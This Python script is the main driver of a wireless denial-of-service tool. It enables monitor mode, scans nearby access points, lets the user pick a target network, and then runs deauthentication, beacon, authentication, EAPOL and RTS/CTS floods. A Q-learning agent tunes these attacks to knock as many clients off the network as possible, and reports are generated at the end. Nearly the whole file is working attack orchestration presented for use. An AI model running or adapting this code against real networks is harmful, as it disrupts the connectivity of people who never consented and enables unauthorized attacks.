#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
main.py - The main script for launching a DoS utility with ML (Q-Learning) and reporting.
"""

import os
import sys
import time
import subprocess
import signal
import random
import csv
import re

from attacks import (
    DeauthFlood, BeaconFlood, AuthDOS,
    DeauthFloodMDK, EAPOLStartFlood,
    WIDSConfusion, RTSCTSFlood, stop_all_attacks
)
from traffic_analyzer import TrafficAnalyzer
from ml_core import QLearningAgent

from report import cli_summary, generate_html  # <-- импорт отчётности


def monitor_mode_setup():
    print("[INFO] Checking for processes to kill...")
    os.system("sudo airmon-ng check kill")
    interfaces = subprocess.getoutput("sudo airmon-ng").split("\n")
    print("\n[INFO] Available Interfaces for Monitor Mode:")
    for line in interfaces:
        print(line)
    interface = input("\nEnter interface for monitor mode (e.g. wlan0): ").strip()
    if not interface:
        print("[ERROR] No interface.")
        sys.exit(1)
    os.system(f"sudo airmon-ng start {interface}")
    new_interfaces = subprocess.getoutput("iwconfig").split("\n")
    monitor_interface = interface
    for line in new_interfaces:
        if "Mode:Monitor" in line:
            monitor_interface = line.split()[0]
            break
    print(f"[INFO] {interface} -> monitor mode as {monitor_interface}")
    return monitor_interface


def get_network_list(monitor_interface):
    print("[INFO] Running airodump-ng for 10 seconds to find APs...")
    os.system("sudo rm -f /tmp/airodump-01.csv /tmp/airodump-01.kismet* /tmp/airodump-01.log.csv")
    process = subprocess.Popen(
        f"sudo airodump-ng {monitor_interface} --write /tmp/airodump --output-format csv --write-interval 1",
        shell=True, preexec_fn=os.setsid,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    for _ in range(10):
        sys.stdout.write(".")
        sys.stdout.flush()
        time.sleep(1)
    print("\n[INFO] Stopping airodump-ng...")
    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    time.sleep(2)
    csv_file = "/tmp/airodump-01.csv"
    if not os.path.exists(csv_file):
        print("[ERROR] No airodump output.")
        return None, None

    networks = []
    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            row = line.strip().split(",")
            if len(row) > 13 and row[0].count(":") == 5:
                networks.append((row[0].strip(), row[3].strip(), row[13].strip()))

    if not networks:
        print("[INFO] No networks found. Exiting.")
        return None, None

    unique = {bssid:(ch,essid) for bssid,ch,essid in networks}
    print("\n[INFO] Networks found:")
    print("Num | BSSID              | Channel | ESSID")
    print("-------------------------------------------")
    for i,(bssid,(ch,essid)) in enumerate(unique.items(),1):
        print(f"{i:>3} | {bssid:<18} | {ch:<7} | {essid}")

    while True:
        choice = input("\nSelect target network number: ").strip()
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(unique):
                b = list(unique.keys())[idx-1]
                ch, _ = unique[b]
                print(f"[INFO] Chosen BSSID={b}, Channel={ch}")
                return b, ch
        print("[ERROR] Invalid choice.")


def is_valid_mac(mac):
    return re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac.strip()) is not None


def parse_station_count(bssid, monitor_if, channel, capture_time=5, prefix="/tmp/airodump-stations", baseline=None):
    import csv
    os.system(f"sudo rm -f {prefix}-01.csv {prefix}-01.kismet* {prefix}-01.log.csv")
    cmd = (
        f"sudo airodump-ng --bssid {bssid} --channel {channel} "
        f"--write {prefix} --output-format csv --write-interval 1 {monitor_if}"
    )
    proc = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(capture_time)
    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    time.sleep(1)

    path = f"{prefix}-01.csv"
    if not os.path.exists(path):
        return (0,set()) if baseline is None else 0

    with open(path, newline='', encoding="utf-8", errors="ignore") as f:
        rows = list(csv.reader(f))
    station_macs = set()
    header = None
    for idx,row in enumerate(rows):
        if row and row[0].strip()=="Station MAC":
            header = idx
            break
    if header is not None:
        for row in rows[header+1:]:
            if len(row)>=6 and is_valid_mac(row[0]):
                if row[5].strip().lower()==bssid.lower():
                    station_macs.add(row[0].strip())

    if baseline is not None:
        return len(station_macs & baseline)
    else:
        return len(station_macs), station_macs


def main_loop(monitor_if, bssid, channel):
    attack_classes = [
        DeauthFlood,
        BeaconFlood,
        AuthDOS,
        DeauthFloodMDK,
        EAPOLStartFlood,
        WIDSConfusion,
        RTSCTSFlood
    ]
    agent = QLearningAgent(
        attack_classes=attack_classes,
        pps_levels=[1, 2],
        threads_levels=[1, 2],
        power_levels=[1],
        duration_levels=[1, 2],
        max_combo=2,
        alpha=0.1,
        gamma=0.9,
        epsilon_start=0.9,
        epsilon_end=0.1,
        epsilon_decay=0.98
    )

    agent.success_history = []

    os.system(f"sudo iwconfig {monitor_if} channel {channel}")
    time.sleep(1)

    # baseline for station_count
    base_count, baseline_macs = parse_station_count(bssid, monitor_if, channel)
    print(f"[INFO] Initial station_count={base_count}")

    analyzer = TrafficAnalyzer(pcap_file="/tmp/capture.pcap", bssid=bssid)
    analyzer.establish_baseline(duration=2)

    current_state = (base_count, 0, 0)

    EPISODES = 15
    STEPS_PER_EPISODE = 3

    for episode in range(1, EPISODES + 1):
        print(f"\n===== EPISODE {episode}/{EPISODES} =====")
        for step in range(1, STEPS_PER_EPISODE + 1):
            action_combo = agent.select_action(current_state)

            agent.current_context = (episode, step, action_combo)

            threads = []
            for atk_obj, pps_lv, thr_lv, pow_lv, dur_lv in action_combo:
                threads += atk_obj.run(
                    pps_level=pps_lv,
                    threads_level=thr_lv,
                    power_level=pow_lv,
                    duration_level=dur_lv,
                    bssid=bssid,
                    interface=monitor_if,
                    channel=channel
                )

            time.sleep(3)
            stop_all_attacks()
            for t in threads:
                t.join()

            os.system("sudo rm -f /tmp/capture.pcap")
            os.system(f"sudo timeout 2 tcpdump -i {monitor_if} -w /tmp/capture.pcap >/dev/null 2>&1")
            analyzer.pcap_file = "/tmp/capture.pcap"
            analyzer.analyze_offline()
            features = analyzer.get_features()

            # station_count
            new_count = parse_station_count(bssid, monitor_if, channel, baseline=baseline_macs)
            effective = new_count if new_count >= (len(baseline_macs)/2) else 0

            current_perf = analyzer.get_current_performance(duration=1)
            reward = analyzer.baseline - current_perf

            old = current_state[0]
            if effective < old and effective > 0:
                reward += 0.5 * (old - effective)
            if effective == 0:
                reward += 5.0 if old>0 else 1.0

            pred = 1 if reward>=1.0 else 0
            true = 1
            agent.record_outcome(pred, true)

            next_state = (effective, features["handshake_detected"], 0)
            agent.update_q(current_state, action_combo, reward, next_state)
            print(f"[STEP] E={episode}, Step={step}, st_count={new_count}, reward={reward:.2f}")
            for i, slot in enumerate(action_combo,1):
                atk, pps_lv, thr_lv, pw_lv, dur_lv = slot
                print(f"   combo#{i}: {atk.name}, pps={pps_lv}, thr={thr_lv}, power={pw_lv}, dur={dur_lv}")
            current_state = next_state
            time.sleep(2)

        acc, prec, rec, f1 = agent.compute_metrics()
        print(f"[METRICS] Episode={episode}, Acc={acc:.2f}, Prec={prec:.2f}, Recall={rec:.2f}, F1={f1:.2f}")
        agent.decay_epsilon()

    print("[INFO] Q-Learning done.")
    best_combo = agent.get_best_action(current_state)
    if best_combo:
        print(f"[INFO] Best combo at final state {current_state}:")
        for i, slot in enumerate(best_combo,1):
            atk, pps_lv, thr_lv, pw_lv, dur_lv = slot
            print(f"   combo#{i}: {atk.name}, pps={pps_lv}, thr={thr_lv}, power={pw_lv}, dur={dur_lv}")
    else:
        print("[INFO] No best combo found yet.")

    # --- report here ---
    cli_summary(agent.success_history, best_combo)
    generate_html(agent.success_history, best_combo)

def main():
    monitor_if = monitor_mode_setup()
    bssid, channel = get_network_list(monitor_if)
    if not bssid or not channel:
        sys.exit(1)
    main_loop(monitor_if, bssid, channel)


if __name__ == "__main__":
    main()
